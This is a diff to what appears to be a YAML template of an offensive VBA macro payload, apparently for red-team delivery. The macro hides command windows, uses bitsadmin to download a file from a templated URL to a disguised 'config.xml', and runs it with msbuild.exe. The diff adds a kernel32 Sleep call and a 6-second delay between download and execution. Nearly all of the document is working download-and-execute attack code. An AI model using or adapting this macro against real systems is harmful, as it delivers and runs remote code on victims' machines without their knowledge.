@@ -6,6 +6,7 @@ metadata:
   authors: ["@s3mme", "@TIVKU"]
 
 content: |
+  Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
   Function RunCommand(cmd As String) As Long
       RunCommand = Shell(cmd, vbHide)
   End Function
@@ -18,5 +19,6 @@ content: |
       LocalFilePath = "{{ delivery_path_windows }}\config.xml"
 
       RunCommand "cmd.exe /c bitsadmin /transfer myJob /download /priority normal " & myURL & " " & LocalFilePath
+      Sleep 6000
       RunCommand "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe " & LocalFilePath
   End Sub
